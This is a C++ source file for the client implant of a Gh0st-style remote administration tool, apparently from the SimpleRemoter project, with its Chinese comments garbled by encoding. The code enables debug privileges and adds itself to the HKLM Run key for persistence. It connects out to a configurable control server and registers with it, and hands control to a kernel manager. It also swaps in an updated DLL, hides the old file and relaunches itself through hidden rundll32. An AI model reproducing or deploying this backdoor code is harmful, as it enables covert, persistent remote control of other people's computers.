// ClientDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "Common.h"
#include "IOCPClient.h"
#include <IOSTREAM>
#include "LoginServer.h"
#include "KernelManager.h"
#include <iosfwd>
#include <vector>
#include <iostream>
#include <fstream>
#include <sstream>
#include <shellapi.h>
#include <corecrt_io.h>

// �Զ�����ע����е�ֵ
#define REG_NAME "a_ghost"

// Զ�̵�ַ
CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "127.0.0.1", 6543, CLIENT_TYPE_ONE};

// Ӧ�ó���״̬��1-���ض��˳� 2-���ض��˳� 3-����������
BOOL g_bExit = 0;
// �����߳�״̬
BOOL g_bThreadExit = 0;

HINSTANCE  g_hInstance = NULL;        
DWORD WINAPI StartClient(LPVOID lParam);

#if _CONSOLE

enum { E_RUN, E_STOP } status;

//����Ȩ��
void DebugPrivilege()
{
	HANDLE hToken = NULL;
	//�򿪵�ǰ���̵ķ�������
	int hRet = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);

	if (hRet)
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		//ȡ������Ȩ�޵�LUID
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		//�����������Ƶ�Ȩ��
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

		CloseHandle(hToken);
	}
}

/**
* @brief ���ñ�����������
* @param[in] *sPath ע����·��
* @param[in] *sNmae ע���������
* @return ����ע����
* @details Win7 64λ�����ϲ��Խ��������ע�����ڣ�\n
* HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
* @note �״�������Ҫ�Թ���ԱȨ�����У�������ע���д�뿪��������
*/
BOOL SetSelfStart(const char* sPath, const char* sNmae)
{
	DebugPrivilege();

	// д���ע���·��
#define REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"

	// ��ע�����д��������Ϣ
	HKEY hKey = NULL;
	LONG lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);

	// �ж��Ƿ�ɹ�
	if (lRet != ERROR_SUCCESS)
		return FALSE;

	lRet = RegSetValueExA(hKey, sNmae, 0, REG_SZ, (const BYTE*)sPath, strlen(sPath) + 1);

	// �ر�ע���
	RegCloseKey(hKey);

	// �ж��Ƿ�ɹ�
	return lRet == ERROR_SUCCESS;
}

// ���ؿ���̨
// �ο���https://blog.csdn.net/lijia11080117/article/details/44916647
// step1: ��������"�߼�"������ڵ�ΪmainCRTStartup
// step2: ��������"ϵͳ"����ϵͳΪ����
// ���

BOOL CALLBACK callback(DWORD CtrlType)
{
	if (CtrlType == CTRL_CLOSE_EVENT)
	{
		g_bExit = true;
		while (E_RUN == status)
			Sleep(20);
	}
	return TRUE;
}

int main(int argc, const char *argv[])
{
	if (!SetSelfStart(argv[0], REG_NAME))
	{
		Mprintf("���ÿ���������ʧ�ܣ����ù���ԱȨ������.\n");
	}

	status = E_RUN;

	HANDLE hMutex = ::CreateMutexA(NULL, TRUE, "ghost.exe");
	if (ERROR_ALREADY_EXISTS == GetLastError())
	{
		CloseHandle(hMutex);
		return -2;
	}
	
	SetConsoleCtrlHandler(&callback, TRUE);
	if (argc>=3)
	{
		g_SETTINGS.SetServer(argv[1], atoi(argv[2]));
	}
	if (strlen(g_SETTINGS.ServerIP())==0|| g_SETTINGS.ServerPort()<=0)	{
		Mprintf("��������: ���ṩԶ������IP�Ͷ˿�!\n");
		Sleep(3000);
		return -1;
	}
	Mprintf("[server] %s:%d\n", g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort());

	// ��ȡ��ǰģ��ľ����HINSTANCE�� 
	g_hInstance = GetModuleHandle(NULL); 
	if (g_hInstance != NULL) {
		Mprintf("HINSTANCE: %p\n", g_hInstance);
	} else {
		Mprintf("Failed to get HINSTANCE!\n");
	}

	do{
		g_bExit = 0;
		HANDLE hThread = CreateThread(NULL,0,StartClient,NULL,0,NULL);

		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}while (E_RUN == status && 1 != g_bExit);

	status = E_STOP;

	CloseHandle(hMutex);
	return 0;
}
#else

BOOL APIENTRY DllMain( HINSTANCE hInstance, 
					  DWORD  ul_reason_for_call, 
					  LPVOID lpReserved
					  )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:	
	case DLL_THREAD_ATTACH:
		{
			g_hInstance = (HINSTANCE)hInstance; 

			break;
		}		
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

// ��������һ��ghost
extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
{
	g_bExit = FALSE;
	if (strlen(szServerIP)>0 && uPort>0)
	{
		g_SETTINGS.SetServer(szServerIP, uPort);
	}
	g_SETTINGS.SetType(CLIENT_TYPE_DLL);

	HANDLE hThread = CreateThread(NULL,0,StartClient,NULL,0,NULL);
	if (hThread == NULL) {
		return;
	}
#ifdef _DEBUG
	WaitForSingleObject(hThread, INFINITE);
#else
	WaitForSingleObject(hThread, INFINITE);
#endif
	CloseHandle(hThread);
}

// ֹͣ����
extern "C" __declspec(dllexport) void StopRun() { g_bExit = true; }

// �Ƿ�ɹ�ֹͣ
extern "C" __declspec(dllexport) bool IsStoped() { return g_bThreadExit; }

// �Ƿ��˳��ͻ���
extern "C" __declspec(dllexport) BOOL IsExit() { return g_bExit; }

// copy from: SimpleRemoter\client\test.cpp
// �����µ�DLL
void RunNewDll(const char* cmdLine) {
	char path[_MAX_PATH], * p = path;
	GetModuleFileNameA(NULL, path, sizeof(path));
	while (*p) ++p;
	while ('\\' != *p) --p;
	*(p + 1) = 0;
	std::string folder = path;
	std::string oldFile = folder + "ServerDll.old";
	std::string newFile = folder + "ServerDll.new";
	strcpy(p + 1, "ServerDll.dll");
	BOOL ok = TRUE;
	if (_access(newFile.c_str(), 0) != -1) {
		if (_access(oldFile.c_str(), 0) != -1)
		{
			if (!DeleteFileA(oldFile.c_str()))
			{
				Mprintf("Error deleting file. Error code: %d\n", GetLastError());
				ok = FALSE;
			}
		}
		if (ok && !MoveFileA(path, oldFile.c_str())) {
			Mprintf("Error removing file. Error code: %d\n", GetLastError());
			if (_access(path, 0) != -1)
			{
				ok = FALSE;
			}
		}
		else {
			// �����ļ�����Ϊ����
			if (SetFileAttributesA(oldFile.c_str(), FILE_ATTRIBUTE_HIDDEN))
			{
				Mprintf("File created and set to hidden: %s\n", oldFile.c_str());
			}
		}
		if (ok && !MoveFileA(newFile.c_str(), path)) {
			Mprintf("Error removing file. Error code: %d\n", GetLastError());
			MoveFileA(oldFile.c_str(), path);// recover
		}
		else if (ok) {
			Mprintf("Using new file: %s\n", newFile.c_str());
		}
	}
	char cmd[1024];
	sprintf_s(cmd, "%s,Run %s", path, cmdLine);
	ShellExecuteA(NULL, "open", "rundll32.exe", cmd, NULL, SW_HIDE);
}

/* ���пͻ��˵ĺ��Ĵ���. ��Ϊ���嵼������, ���� rundll32 ����Լ��.
HWND hwnd: �����ھ����ͨ��Ϊ NULL����
HINSTANCE hinst: DLL ��ʵ�������
LPSTR lpszCmdLine: �����в�������Ϊ�ַ������ݸ�������
int nCmdShow: ������ʾ״̬��
�������rundll32.exe ClientDemo.dll,Run 127.0.0.1:6543
���ȴ������в����ж�ȡ������ַ�������ָ�������ʹ�ȫ�ֱ�����ȡ��
*/
extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
	char message[256] = { 0 };
	if (strlen(lpszCmdLine) != 0) {
		strcpy_s(message, lpszCmdLine);
	}else if (g_SETTINGS.IsValid())
	{
		sprintf_s(message, "%s:%d", g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort());
	}

	std::istringstream stream(message);
	std::string item;
	std::vector<std::string> result;
	while (std::getline(stream, item, ':')) {
		result.push_back(item);
	}
	if (result.size() == 1)
	{
		result.push_back("80");
	}
	if (result.size() != 2) {
		MessageBox(hwnd, "���ṩ��ȷ��������ַ!", "��ʾ", MB_OK);
		return;
	}
	
	do {
		TestRun((char*)result[0].c_str(), atoi(result[1].c_str()));
		while (!IsStoped())
			Sleep(20);
		if (g_bExit == 1)
			return;
		else if (g_bExit == 2)
			continue;
		else // 3
			break;
	} while (true);

	sprintf_s(message, "%s:%d", g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort());
	RunNewDll(message);
}

#endif

DWORD WINAPI StartClient(LPVOID lParam)
{
	IOCPClient  *ClientObject = new IOCPClient(g_bExit);

	g_bThreadExit = false;
	while (!g_bExit)
	{
		ULONGLONG dwTickCount = GetTickCount64();
		if (!ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort()))
		{
			for (int k = 500; !g_bExit && --k; Sleep(10));
			continue;
		}
		//׼����һ������
		SendLoginInfo(ClientObject, GetTickCount64()-dwTickCount, g_SETTINGS.ClientType());

		CKernelManager	Manager(&g_SETTINGS, ClientObject, g_hInstance);
		bool	bIsRun = 0;
		do 
		{
			Sleep(200);

			bIsRun  = ClientObject->IsRunning();

		} while (bIsRun && ClientObject->IsConnected() && !g_bExit);
		while (GetTickCount64() - dwTickCount < 5000 && !g_bExit)
			Sleep(200);
	}

	Mprintf("StartClient end\n");
	delete ClientObject;
	g_bThreadExit = true;

	return 0;
} 
